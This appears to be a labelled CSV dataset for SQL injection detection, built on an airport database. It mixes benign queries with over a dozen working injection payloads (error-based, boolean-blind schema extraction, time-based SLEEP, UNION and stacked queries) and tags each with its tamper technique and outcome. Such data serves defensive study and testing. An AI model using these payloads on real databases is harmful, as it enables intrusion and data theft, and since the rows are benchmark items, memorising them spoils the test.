"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""IR-23""",0,AS IR-23,,,,select,airport-S8,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 162.0+(SELECT ZOTi WHERE 7960=7960 AND EXP/**/(~(SELECT * FROM (SELECT CONCAT/**/(0x717a787671,(SELECT (ELT/**/(2878=2878,1))),0x7170786a71,0x78))x)))+ AND 162.0+(SELECT ZOTi WHERE 7960=7960 AND EXP/**/(~(SELECT * FROM (SELECT CONCAT/**/(0x717a787671,(SELECT (ELT/**/(2878=2878,1))),0x7170786a71,0x78))x)))+",1," 162.0+(SELECT ZOTi WHERE 7960=7960 EXP/**/(~(SELECT * FROM (SELECT CONCAT/**/(0x717a787671,(SELECT (ELT/**/(2878=2878,1))),0x7170786a71,0x78))x)))+ 162.0+(SELECT ZOTi WHERE 7960=7960 EXP/**/(~(SELECT * FROM (SELECT CONCAT/**/(0x717a787671,(SELECT (ELT/**/(2878=2878,1))),0x7170786a71,0x78))x)))+",recon,commentbeforeparentheses,success,select,airport-S2,error-163,error,test
"DELETE FROM airport_frequencies WHERE type = ""FSS"";",0,FSS,,,,delete,airport-D4,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Klong 11"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""Aviosuperficie Vigarolo"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""PDM, Capt Justiniano Montenegro, MP00"", ""%"");",0,"Klong 11 Aviosuperficie Vigarolo PDM, Capt Justiniano Montenegro, MP00",,,,select,airport-S17,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Colinas do Tocantins Airport""",0,Colinas do Tocantins Airport,,,,select,airport-S3,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""MY"" GROUP BY r.name ORDER BY r.name ASC;",0,MY,,,,select,airport-S16,,,train
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"UPDATE airport_frequencies SET description = ""CLNC DEL"" WHERE airport_ident = ""KFWA"";",0,CLNC DEL KFWA,,,,update,airport-U5,,,test
CREATE USER 'root'@'localhost' IDENTIFIED BY 'EbepT7bO6dbiyMemdhYP',0,,,,,admin,airport-admin13,,,test
"DELETE FROM airport_frequencies WHERE type = ""CTAF"";",0,CTAF,,,,delete,airport-D4,,,test
"DELETE FROM regions WHERE name = ""Sîngerei District"";",0,Sîngerei District,,,,delete,airport-D8,,,train
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""GD"" GROUP BY r.name ORDER BY r.name ASC;",0,GD,,,,select,airport-S16,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""ZZ"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,ZZ 2,,,,select,airport-S19,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""WT90"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""WT90"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""WT90"", ""%"");",1, WT90 WT90 WT90 ,recon,multiplespaces,failure,select,airport-S17,boolean-240,boolean,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Maltahoehe;""",0,Maltahoehe,,,,select,airport-S21,,,test
"UPDATE countries SET keywords = ""Airports in Cayman Islands"" WHERE code = ""GN"";",0,Airports in Cayman Islands GN,,,,update,airport-U8,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""AZ"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,AZ 2,,,,select,airport-S19,,,test
"UPDATE airport_frequencies SET description = ""ATIS"" WheRE 4302=4302 And 4826=(SELect (CAsE WheN (oRd(mId((SELect IfnUlL(caSt(CoLumN_nAme aS nCHaR),0x20) fRoM INFORMATION_SCHEMA.COLUMnS WheRE tABLe_NamE=0x616972706f7274 And table_schema=0x64617461736574 lIMIT 18,1),2,1))>102) Then 4826 ELSe (SELect 3984 UniON SELect 6887) End))-- -"" WHERE airport_ident = ""DE-0885"";",1," ATIS"" WheRE 4302=4302 And 4826=(SELect (CAsE WheN (oRd(mId((SELect IfnUlL(caSt(CoLumN_nAme aS nCHaR),0x20) fRoM INFORMATION_SCHEMA.COLUMnS WheRE tABLe_NamE=0x616972706f7274 And table_schema=0x64617461736574 lIMIT 18,1),2,1))>102) Then 4826 ELSe (SELect 3984 UniON SELect 6887) End))-- - DE-0885 ",exploit,randomcase,success,update,airport-U5,boolean-78,boolean,test
"DELETE FROM airport WHERE name LIKE ""Padeah Airport"" OR keywords LIKE ""LH4"";  ",0,Padeah Airport LH4,,,,delete,airport-D3,,,train
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""BR-1817""))) RLIKE (SELECT (CASE WHEN (8764 LIKE 8764) THEN 0x42522d31383137 ELSE 0x28 END)) AND (((""mTBb"" LIKE ""mTBb"", ""closed"", ""Torgau-Beilrode Airfield"", -32.2406, -53.402221679688)",1," BR-1817""    RLIKE (SELECT (CASE WHEN (8764 LIKE 8764  THEN 0x42522d31383137 ELSE 0x28 END   AND (((""mTBb"" LIKE ""mTBb closed Torgau-Beilrode Airfield -32.2406 -53.402221679688 ",recon,equaltolike,failure,insert,airport-I1,boolean-0,boolean,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 118.15 AND  120.5  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  125.3  AND  125.8  ORDER BY frequency;",0,118.15 120.5 125.3 125.8,,,,select,airport-S13,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""MX""",0,MX,,,,select,airport-S9,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 689.0 AND 374.0",0,689.0 374.0,,,,select,airport-S2,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""ZA"" GROUP BY r.name ORDER BY r.name ASC;",0,ZA,,,,select,airport-S16,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""1541"" AS SIGNED) AND a.iso_country = ""KH"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,1541 KH,,,,select,airport-S22,,,test
"DELETE FROM airport WHERE name = ""Atang Senjaya Airport"";  ",0,Atang Senjaya Airport,,,,delete,airport-D2,,,test
"UPDATE countries SET keywords = ""Airports in Cook Islands"" WHERE code = ""VC"";",0,Airports in Cook Islands VC,,,,update,airport-U8,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""AU"" GROUP BY r.name ORDER BY r.name ASC;",0,AU,,,,select,airport-S16,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (96039, ""FOF"", ""Ezeiza"", ""VOR-DME"", 280, ""US"")",0,96039 FOF Ezeiza VOR-DME 280 US,,,,insert,airport-I10,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""MX-0624"";",0,MX-0624,,,,select,airport-S7,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""MI20"";",0,MI20,,,,select,airport-S7,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (347848, ""TX83"", 9843.0, ""X""))) uNIOn ALl SeLEcT NULl,NULl,NULl,NULl,NULl,NULl,NULl,NULl,NULl-- -"", 1, 0)",1," 347848 TX83 9843.0 X""    uNIOn ALl SeLEcT NULl,NULl,NULl,NULl,NULl,NULl,NULl,NULl,NULl-- - 1 0 ",recon,randomcase,failure,insert,airport-I9,union-50,union,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""96TS"",""small_airport"", ""Vulture Roost Airport"",""https://en.wikipedia.org/wiki/Victoria_International_Airport"",""AS"")",0,96TS small_airport Vulture Roost Airport https://en.wikipedia.org/wiki/Victoria_International_Airport AS,,,,insert,airport-I3,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""BH"" GROUP BY r.name ORDER BY r.name ASC;",0,BH,,,,select,airport-S16,,,train
SHOW GRANTS FOR  'azureuser';,0,,,,,admin,airport-admin11,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""QA"" GROUP BY r.name ORDER BY r.name ASC;",0,QA,,,,select,airport-S5,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""ZM"" OR c.name LIKE CONCAT(""%"", ""Anguilla"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 5 ORDER BY navaid_count DESC;",0,ZM Anguilla 5,,,,select,airport-S20,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (-5179' oRder By 1#, ""7J"", ""Rubelsanto"", ""VOR-DME"", 325, ""US"")",1," -5179' oRder By 1# 7J"" Rubelsanto"" VOR-DME 325 US ",recon,randomcase,failure,insert,airport-I10,union-56,union,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""MX""",0,MX,,,,select,airport-S6,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""ESGF"", ""heliport"", ""Shenyang Taoxian International Airport"", -23.65549, -59.1906));SELECT	SLEEP(5)#, 177.0)",1, ESGF heliport Shenyang Taoxian International Airport -23.65549 -59.1906  ;SELECT	SLEEP(5 # 177.0 ,recon,space2mysqlblank,failure,insert,airport-I2,stacked-9,stacked,test
"UPDATE airport_frequencies SET frequency_mhz = 122.2 WHERE type = ""TWR') ORDER BY 1-- -"";",1, 122.2 TWR') ORDER BY 1-- - ,recon,commentbeforeparentheses,failure,update,airport-U6,union-86,union,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""US-5058"";",0,US-5058,,,,select,airport-S7,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""BCATP"") OR name LIKE ""De Beers Canada""",0,BCATP De Beers Canada,,,,select,airport-S10,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""SDFD"";",0,SDFD,,,,select,airport-S7,,,train
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""SIAB"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Bayelsa"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Micronesian airports"", ""%"");",0,SIAB Airports in Bayelsa Micronesian airports,,,,select,airport-S18,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""JP8"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""MJG"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Academy Sweet Apartment"", ""%"");",0,JP8 MJG Academy Sweet Apartment,,,,select,airport-S17,,,test
"SELECT * FROM airport WHERE continent = ""SA"" AND iso_region LIKE ""AU-NT""",0,SA AU-NT,,,,select,airport-S8,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 744.0"" AND (SELECT 3001 FROM (SELECT(SLEEP(5)))IAce)-- MmyH",1," US 744.0"" AND (SELECT 3001 FROM (SELECT(SLEEP(5)))IAce)-- MmyH",recon,equaltolike,success,select,airport-S11,time-220,time,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""VI"" GROUP BY r.name ORDER BY r.name ASC;",0,VI,,,,select,airport-S5,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""TV"" GROUP BY r.name ORDER BY r.name ASC;",0,TV,,,,select,airport-S5,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Garner Field"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Garner Field,,,,select,airport-S14,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""KGAS"", ""closed"", ""Ajog Heliport"", 19.484004, -106.1743889, 5830.0)",0,KGAS closed Ajog Heliport 19.484004 -106.1743889 5830.0,,,,insert,airport-I2,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""BS"", ""Poland"", ""AF"", ""Manx"")",0,BS Poland AF Manx,,,,insert,airport-I6,,,test
"DELETE FROM airport WHERE name = ""Maltahoehe 9 Kal Landing Site"";  ",0,Maltahoehe 9 Kal Landing Site,,,,delete,airport-D2,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""FVHA,Harare"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Yukon"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Ethiopian airports"", ""%"");",0,"FVHA,Harare Airports in Yukon Ethiopian airports",,,,select,airport-S18,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""04AN"", ""closed"", ""Racer's Ag Airport"", 31.6238, -46.66180038452149)",0,04AN closed Racer's Ag Airport 31.6238 -46.66180038452149,,,,insert,airport-I1,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Pakowki Lake West Airport""",0,Pakowki Lake West Airport,,,,select,airport-S3,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Platform Edith Heliport""",0,Platform Edith Heliport,,,,select,airport-S3,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"DELETE FROM runways WHERE airport_ident = ""NC98"";",0,NC98,,,,delete,airport-D5,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""4536"" AS SIGNED) AND a.iso_country = ""CN"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,4536 CN,,,,select,airport-S22,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""IL"" GROUP BY r.name ORDER BY r.name ASC;",0,IL,,,,select,airport-S16,,,train
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 118.9 AND  132.3  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  126.2  AND  135.7  ORDER BY frequency;",0,118.9 132.3 126.2 135.7,,,,select,airport-S13,,,train
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""UZ"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 3 ORDER BY runway_count DESC, a.name ASC;",0,UZ 3,,,,select,airport-S19,,,test
SELECT * FROM airport WHERE icao_code = 'RKPK';,0,RKPK,,,,select,airport-S1,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Blau Farmacêutica Helipad"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Blau Farmacêutica Helipad,,,,select,airport-S14,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""GF"", ""Germany"", ""EU"", ""Angolan airports"")",0,GF Germany EU Angolan airports,,,,insert,airport-I6,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""VA"" GROUP BY r.name ORDER BY r.name ASC;",0,VA,,,,select,airport-S16,,,train
"SELECT id, ident, name FROM airport WHERE iso_country = ""FR""",0,FR,,,,select,airport-S6,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (57212, 4423, ""YMDY"", ""AWOS"", ""GND"", 121.05)",0,57212 4423 YMDY AWOS GND 121.05,,,,insert,airport-I8,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 123.2 AND  124.175  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  122.605  AND  122.7  ORDER BY frequency;",0,123.2 124.175 122.605 122.7,,,,select,airport-S13,,,test
"DELETE FROM navaids WHERE ident = ""-8281')
AS	dEEYWHERE�3394=3394OR	EXTRACTVALUE(8307,CASE	WHEN�(8307=7783)�THEN	8307ELSE0x3AEND)--
hMex"";",1," -8281')
AS	dEEYWHERE�3394=3394OR	EXTRACTVALUE(8307,CASE	WHEN�(8307=7783)�THEN	8307ELSE0x3AEND)--
hMex ",recon,space2mysqlblank,failure,delete,airport-D6,boolean-138,boolean,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""1889"" AS SIGNED) AND a.iso_country = ""TG"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,1889 TG,,,,select,airport-S22,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (26592, ""BR-2491"", 3800.0, ""GRVL"", 0, 0)",0,26592 BR-2491 3800.0 GRVL 0 0,,,,insert,airport-I9,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Masbate Province"";",0,Masbate Province,,,,select,airport-S15,,,test
"UPDATE regions SET keywords = ""Airports in Maguindanao Province"" WHERE iso_country = ""MH"";",0,Airports in Maguindanao Province MH,,,,update,airport-U9,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""3239"" AS SIGNED) AND a.iso_country = ""AL"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,3239 AL,,,,select,airport-S22,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Ariana Governorate"";",0,Ariana Governorate,,,,select,airport-S15,,,test
"DELETE FROM countries WHERE code = ""BO"";",0,BO,,,,delete,airport-D7,,,train
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 300.0",0,US 300.0,,,,select,airport-S11,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (67478, 5742, ""YSGE"", ""AWOS"", ""CTAF"", 122.2)",0,67478 5742 YSGE AWOS CTAF 122.2,,,,insert,airport-I8,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (61240, 20143, ""WIPT"", ""INFO"", ""CTAF"", 122.2)",0,61240 20143 WIPT INFO CTAF 122.2,,,,insert,airport-I8,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""GR"" GROUP BY r.name ORDER BY r.name ASC;",0,GR,,,,select,airport-S16,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""PT""",0,PT,,,,select,airport-S6,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""FO"" GROUP BY r.name ORDER BY r.name ASC;",0,FO,,,,select,airport-S5,,,test
"UPDATE navaids SET name = ""Hamilton"" WHERE ident = ""DBQ"";",0,Hamilton DBQ,,,,update,airport-U7,,,train
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Danglayan, Chevron"") OR name LIKE ""canberra gliding club""",0,"Danglayan, Chevron canberra gliding club",,,,select,airport-S10,,,train
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (9345, ""32MS"", 10991.0, ""ASP"", 0, 0)",0,9345 32MS 10991.0 ASP 0 0,,,,insert,airport-I9,,,test
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/List_of_highway_airstrips_in_North_Korea"" WHERE ident = ""KOPN""",0,https://en.wikipedia.org/wiki/List_of_highway_airstrips_in_North_Korea KOPN,,,,update,airport-U3,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Bear Creek Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Bear Creek Heliport,,,,select,airport-S14,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""BE"", ""-3434 Or eLT(3881=4526,4526)-- LOKi"", ""AF"", ""Niuean airports"")",1," BE -3434 Or eLT(3881=4526,4526)-- LOKi AF Niuean airports ",recon,randomcase,success,insert,airport-I6,boolean-30,boolean,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Gunderson Airport""",0,Gunderson Airport,,,,select,airport-S3,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""CM"" GROUP BY r.name ORDER BY r.name ASC;",0,CM,,,,select,airport-S5,,,test
"DELETE FROM airport WHERE name = ""Grovedale Airport"";  ",0,Grovedale Airport,,,,delete,airport-D2,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Metzingen;""",0,Metzingen,,,,select,airport-S21,,,train
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES ((SELecT coNCAT(coNCAT(0x7176706a71,(SELecT (cAsE WHEn (aUrorA_VerSIoN() LiKe 0x25) theN 1 ELsE 0 eNd))),0x716b7a6b71)), ""3XA6"", 1900.0, ""GRS"", 1, 0)",1," (SELecT coNCAT(coNCAT(0x7176706a71,(SELecT (cAsE WHEn (aUrorA_VerSIoN(  LiKe 0x25  theN 1 ELsE 0 eNd   ,0x716b7a6b71   3XA6 1900.0 GRS 1 0 ",recon,randomcase,success,insert,airport-I9,inline-53,inline,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""KG"" OR c.name LIKE CONCAT(""%"", ""U.S. Virgin Islands"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 5 ORDER BY navaid_count DESC;",0,KG U.S. Virgin Islands 5,,,,select,airport-S20,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('LOLU','CD-0008','NO-0127','YQDI');",0,LOLU CD-0008 NO-0127 YQDI,,,,update,airport-U10,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""US-3993"", ""small_airport"", ""Winchester Regional Airport"", 28.193899, -85.953889, 443.0)",0,US-3993 small_airport Winchester Regional Airport 28.193899 -85.953889 443.0,,,,insert,airport-I2,,,test
"SELECT id FROM airports WHERE name LIKE ""%Gk9tggZxCBNxbiCNhf2I%"" AND longitude BETWEEN 126.981689 AND -98.23059844970705 AND latitude >= 24.663995",0,Gk9tggZxCBNxbiCNhf2I 126.981689 -98.23059844970705 24.663995,,,,select,airport-S23,,,test
"UPDATE navaids SET name = ""Morrisville-Stowe"" WHERE ident = ""MDS"";",0,Morrisville-Stowe MDS,,,,update,airport-U7,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Encontrados Airport"");",0,Encontrados Airport,,,,select,airport-S12,,,test
SELECT * FROM airport WHERE icao_code = 'AYNY';,0,AYNY,,,,select,airport-S1,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""4507"" AS SIGNED) AND a.iso_country = ""GR"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,4507 GR,,,,select,airport-S22,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 311.0 AND 390.0",0,311.0 390.0,,,,select,airport-S2,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""County Waterford"";",0,County Waterford,,,,select,airport-S15,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""LF4422, LF4422"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""OI46, OI46, OI46"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""E86"", ""%"");",0,"LF4422, LF4422 OI46, OI46, OI46 E86",,,,select,airport-S17,,,test
